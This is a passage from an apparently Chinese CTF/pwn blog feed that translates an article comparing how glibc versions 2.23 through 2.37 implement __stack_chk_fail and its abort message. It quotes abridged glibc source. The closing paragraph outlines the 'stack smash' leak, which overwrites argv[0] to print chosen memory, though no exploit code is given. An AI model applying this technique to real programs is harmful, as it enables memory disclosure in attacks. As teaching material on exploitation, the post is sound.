    <url>/2023/03/25/%E5%85%B3%E4%BA%8Eglibc-SSP%E5%8F%91%E7%94%9F%E6%96%B9%E5%BC%8F%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>“本文为《About ***stack smashing detected***》的翻译版本”</p><h2 id="关于-stack-smashing-detected"><a href="#关于-stack-smashing-detected" class="headerlink" title="关于***stack smashing detected***"></a>关于***stack smashing detected***</h2><p>GCC编译器有一个参数叫做”<em>stack-protector</em>“，一共被分为了四种，分别是”<em>fstack-protector</em>“、 “<em>fstack-protector-all</em>“、”<em>fstack-protector-strong</em>“和”<em>fstack-protector-explicit</em>“。它们被用来防止栈溢出。当程序因为函数”<em>__stack_chk_fail</em>“而瘫痪时，你就会收到”<strong>*** stack smashing detected ***: &lt;NameofProgram&gt; terminated\n</strong>“和 “SIGABRT”信号。</p><p>今天我们已然知晓Canary作为一个随机数可以防止栈溢出，但是你应该去了解”<em>__stack_chk_fail</em>“是如何使你的程序瘫痪的。（本文后面都会用crash来表示“程序瘫痪”之意）</p><p>在这篇文章中，我会带领你去找寻在常见的libc中”<em>__stack_chk_fail</em>“是如何让你的程序crash的。</p><p>注： </p><ol><li>我们探讨的主题是<strong>GLIBC</strong>，就是”GNU C Library”的缩写。</li><li>所有在文件中看似无尽的循环都只是想让gcc“开心”，这样就可以防止gcc在编译时因为没有发生return而报错。</li><li>所有后续内容都与glibc-2.23或上一版本进行比较。</li></ol><h2 id="不同的glibc版本"><a href="#不同的glibc版本" class="headerlink" title="不同的glibc版本"></a>不同的glibc版本</h2><h3 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc-2.23"></a>glibc-2.23</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail_local.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/cdefs.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> __stack_chk_fail (<span class="hljs-type">void</span>) __attribute__ ((<span class="hljs-keyword">noreturn</span>));<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) attribute_hidden<br>__stack_chk_fail_local (<span class="hljs-type">void</span>) &#123; __stack_chk_fail (); &#125;<span class="hljs-comment">// 调用__stack_chk_fail</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__stack_chk_fail (<span class="hljs-type">void</span>) &#123; __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125; <span class="hljs-comment">// 调用__fortify_fail</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function<br>__fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)&#123;<br>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) <br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>, <span class="hljs-comment">/* 用2来表示stderr */</span><br>    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<span class="hljs-comment">// 调用__libc_message</span><br>&#125;<br>libc_hidden_def (__fortify_fail)<span class="hljs-comment">// 调用libc_hidden_def，但在本主题中并无特殊用途，故不进行探究</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-type">int</span> do_abort, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...) &#123;<br>  va_list ap;<br>  <span class="hljs-type">int</span> fd = <span class="hljs-number">-1</span>;<br>    <br>  va_start (ap, fmt);<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FATAL_PREPARE</span><br>  FATAL_PREPARE;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">/* 打开/dev/tty的描述符，除非用户显式地在标准错误上请求错误。 */</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>  <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br><br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>    fd = STDERR_FILENO;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">str_list</span> *<span class="hljs-title">list</span> =</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> nlist = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cp = fmt;<br>  <span class="hljs-keyword">while</span> (*cp != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/* 找到下一个&quot;%s&quot;或字符串的结尾。  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *next = cp;<br>      <span class="hljs-keyword">while</span> (next[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;%&#x27;</span> || next[<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;s&#x27;</span>)<br>&#123;<br>  next = __strchrnul (next + <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;%&#x27;</span>);<br><br>  <span class="hljs-keyword">if</span> (next[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      <span class="hljs-comment">/* 确定要打印的内容。  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *str;<br>      <span class="hljs-type">size_t</span> len;<br>      <span class="hljs-keyword">if</span> (cp[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span> &amp;&amp; cp[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;s&#x27;</span>)<br>&#123;<br>  str = va_arg (ap, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *);<br>  len = <span class="hljs-built_in">strlen</span> (str);<br>  cp += <span class="hljs-number">2</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  str = cp;<br>  len = next - cp;<br>  cp = next;<br>&#125;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">str_list</span> *<span class="hljs-title">newp</span> =</span> alloca (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> str_list));<br>      newp-&gt;str = str;<br>      newp-&gt;len = len;<br>      newp-&gt;next = <span class="hljs-built_in">list</span>;<br>      <span class="hljs-built_in">list</span> = newp;<br>      ++nlist;<br>    &#125;<br><br>  <span class="hljs-type">bool</span> written = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (nlist &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">iov</span> =</span> alloca (nlist * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> iovec));<br>      <span class="hljs-type">ssize_t</span> total = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnt = nlist - <span class="hljs-number">1</span>; cnt &gt;= <span class="hljs-number">0</span>; --cnt)<br>&#123;<br>  iov[cnt].iov_base = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">list</span>-&gt;str;<br>  iov[cnt].iov_len = <span class="hljs-built_in">list</span>-&gt;len;<br>  total += <span class="hljs-built_in">list</span>-&gt;len;<br>  <span class="hljs-built_in">list</span> = <span class="hljs-built_in">list</span>-&gt;next;<br>&#125;<br><br>      written = WRITEV_FOR_FATAL (fd, iov, nlist, total);<br><br>      <span class="hljs-keyword">if</span> (do_abort)<br>&#123;<br>  total = ((total + <span class="hljs-number">1</span> + GLRO(dl_pagesize) - <span class="hljs-number">1</span>)<br>   &amp; ~(GLRO(dl_pagesize) - <span class="hljs-number">1</span>));<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">abort_msg_s</span> *<span class="hljs-title">buf</span> =</span> __mmap (<span class="hljs-literal">NULL</span>, total,<br>    PROT_READ | PROT_WRITE,<br>    MAP_ANON | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__glibc_likely (buf != MAP_FAILED))<br>    &#123;<br>      buf-&gt;size = total;<br>      <span class="hljs-type">char</span> *wp = buf-&gt;msg;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>; cnt &lt; nlist; ++cnt)<br>wp = mempcpy (wp, iov[cnt].iov_base, iov[cnt].iov_len);<br>      *wp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-comment">/* 我们必须释放旧缓冲区,</span><br><span class="hljs-comment"> 因为应用程序可能会捕获SIGABRT信号。*/</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">abort_msg_s</span> *<span class="hljs-title">old</span> =</span> atomic_exchange_acq (&amp;__abort_msg,<br>     buf);<br>      <span class="hljs-keyword">if</span> (old != <span class="hljs-literal">NULL</span>)<br>__munmap (old, old-&gt;size);<br>    &#125;<br>&#125;<br>    &#125;<br><br>  va_end (ap);<br><br>  <span class="hljs-keyword">if</span> (do_abort)<br>    &#123;<br>      BEFORE_ABORT (do_abort, written, fd);<br>      <span class="hljs-comment">/* 关闭进程。 */</span><br>      <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在”<em>sysdeps&#x2F;posix&#x2F;libc_fatal.c</em>“中我们可以找到一个叫”<em>__libc_message</em>“函数。如果我们调用这个函数，那么环境变量”<em>LIBC_FATAL_STDERR_</em>“将会从”<em>__libc_secure_gentenv</em>“函数读入值，如果”<em>LIBC_FATAL_STDERR_</em>“的值是’\0’或NULL，stderr会被重定向到”<em>_PATH_TTY</em>‘（一般就是”<em>&#x2F;dev&#x2F;tty</em>“这个路径），于是stderr就会被打印在终端上。所以尽管”<em>__fortify_fail</em>“函数有一个看似是无限循环的”while(1)”，但实际上它并没有造成无限循环的效果。</p><p>在这样复杂的调用之后，msg字符串和__libc_argv[0]或”&lt;unknown&gt;“会被在终端上输出。</p><h3 id="glibc-2-25"><a href="#glibc-2-25" class="headerlink" title="glibc-2.25"></a>glibc-2.25</h3><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“是与在glibc-2.23中的相同位置上的文件是相同的。</p><p>在”<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“中，开发者在最后加上了一句<code>strong_alias (__stack_chk_fail, __stack_chk_fail_local)</code>，但是这仍然在本主题中并无特殊用途，故不进行探究。</p><p>但是在”<em>sysdeps&#x2F;posix&#x2F;libc_fatal.c</em>“中的函数”<em>__libc_message</em>“相对于在glibc-2.23中相同位置上的文件是有一些区别的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/stdio.h</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> __<span class="hljs-title">libc_message_action</span></span><br><span class="hljs-class">&#123;</span><br>  do_message= <span class="hljs-number">0</span>,<span class="hljs-comment">/* 打印信息  */</span><br>  do_abort= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<span class="hljs-comment">/* 中断  */</span><br>  do_backtrace= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span><span class="hljs-comment">/* 回溯  */</span><br>&#125;; <span class="hljs-comment">// do_message=0, do_abort=1, do_backtrace=2</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-keyword">enum</span> __libc_message_action action, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...) &#123;<br>  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  与glibc-2.23相同</span><br><span class="hljs-comment">  */</span><br>  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  没有做回溯前不要调用__libc_secure_getenv，</span><br><span class="hljs-comment">  不然可能会访问损坏的堆栈区</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_backtrace)) <span class="hljs-comment">// 我们可以在注释中明晰创作者的意图</span><br>    &#123; <span class="hljs-comment">// 这其实在很多时候并不会起效</span><br>      <span class="hljs-comment">/* 打开/dev/tty的描述符，除非用户显式地在标准错误上请求错误。 */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>      <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>fd = __open_nocancel (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br>    &#125;<br>    <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  与glibc-2.23相同</span><br><span class="hljs-comment">  */</span><br>    <br>  <span class="hljs-keyword">while</span> (*cp != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      与glibc-2.23相同</span><br><span class="hljs-comment">      */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>    &#123;<br>      <span class="hljs-keyword">if</span> ((action &amp; do_backtrace))<br>BEFORE_ABORT (do_abort, written, fd);<br>      <span class="hljs-comment">/* 关闭进程  */</span><br>      <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相对来说区别不是很大，但是变得更加的标准规范了。</p><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“是与在glibc-2.23中的相同位置上的文件是相同的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__stack_chk_fail (<span class="hljs-type">void</span>) &#123; __fortify_fail_abort (<span class="hljs-literal">false</span>, <span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125;<br>strong_alias (__stack_chk_fail, __stack_chk_fail_local)<br></code></pre></td></tr></table></figure><p>我们注意到原本调用”stack smashing detected”这个字符串的函数被改为了”<em>__fortify_fail_abort</em>“，并且还添加了另外一个被定义在头文件”<em>stdboo.h</em>“中的参数”false”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span><span class="hljs-comment">// 此处也使用该头文件去定义need_backtrace为一个布尔型变量</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__fortify_fail_abort (<span class="hljs-type">_Bool</span> need_backtrace, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg) &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,<br>    <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg,<br>    (need_backtrace &amp;&amp; __libc_argv[<span class="hljs-number">0</span>] != <span class="hljs-literal">NULL</span><br>     ? __libc_argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>));<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg) &#123;<br>  __fortify_fail_abort (<span class="hljs-literal">true</span>, msg);<br>&#125;<br>libc_hidden_def (__fortify_fail)<br>libc_hidden_def (__fortify_fail_abort)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/stdio.h</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> __<span class="hljs-title">libc_message_action</span></span><br><span class="hljs-class">&#123;</span><br>  do_message= <span class="hljs-number">0</span>,<span class="hljs-comment">/* 打印信息  */</span><br>  do_abort= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<span class="hljs-comment">/* 中断  */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在这个glibc版本中，发布者通过添加一个叫need_backtrace的布尔值变量，去避免当”<em>__libc_argv[0]</em>“指向损坏的堆栈空间时的回溯操作。</p><p>“<em>__libc_message</em>“是与在glibc-2.25相同位置上的文件相同的。</p><p>所以glibc-2.27在函数”<em>__libc_message</em>“是否需要回溯上变得更加严格，从而变得更加的安全。</p><h3 id="glibc-2-31-x2F-glibc-2-36-x2F-glibc-2-37"><a href="#glibc-2-31-x2F-glibc-2-36-x2F-glibc-2-37" class="headerlink" title="glibc-2.31&#x2F;glibc-2.36&#x2F;glibc-2.37"></a>glibc-2.31&#x2F;glibc-2.36&#x2F;glibc-2.37</h3><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“是与在glibc-2.23中的相同位置上的文件是相同的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123; __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125;<br>strong_alias (__stack_chk_fail, __stack_chk_fail_local)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123; <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) __libc_message (do_abort, <span class="hljs-string">&quot;*** %s ***: terminated\n&quot;</span>, msg); &#125;<br>libc_hidden_def (__fortify_fail)<br></code></pre></td></tr></table></figure><p>怎么回事？为什么这里使用了相对于上版本更少的代码？仿佛时代倒退了一样！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-keyword">enum</span> __libc_message_action action, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)<br>&#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    与glibc-2.23相同</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (nlist &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">        与glibc-2.23相同</span><br><span class="hljs-comment">      */</span><br>&#125;<br>    <span class="hljs-comment">/* 删去了 written = */</span><br>      WRITEV_FOR_FATAL (fd, iov, nlist, total);<br><br>      <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>&#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">      与glibc-2.25相同</span><br><span class="hljs-comment">      */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>    <span class="hljs-comment">/* 关闭进程  */</span><br>    <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从glibc-2.31开始，发布者删去了相对于glibc-2.27中的以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 打开/dev/tty的描述符，除非用户显式地在标准错误上请求错误。 */</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>  <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br></code></pre></td></tr></table></figure><p>因为他们删去了<code>BEFORE_ABORT (do_abort, written, fd);</code>，这些操作变得不再重要并且不再有效。</p><p>所以我们可以说glibc-2.31中的代码经过优化，在不改变安全性的情况下提高了可读性和可用性，但是攻击的操作仍可以不改变。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述，当一个ELF文件运行时，其文件名会在内存中保存，并且在第一个产生的rbp寄存器之前。所以如果我们知道输入的位置距离argv[0]的字长，我们就可以利用stack smash attach这种攻击方式去获得修改后”argv[0]”的值。</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>About ***stack smashing detected***</title>
    <link href="/2023/03/23/About-stack-smashing-detected/"/>
    <url>/2023/03/23/About-stack-smashing-detected/</url>
    
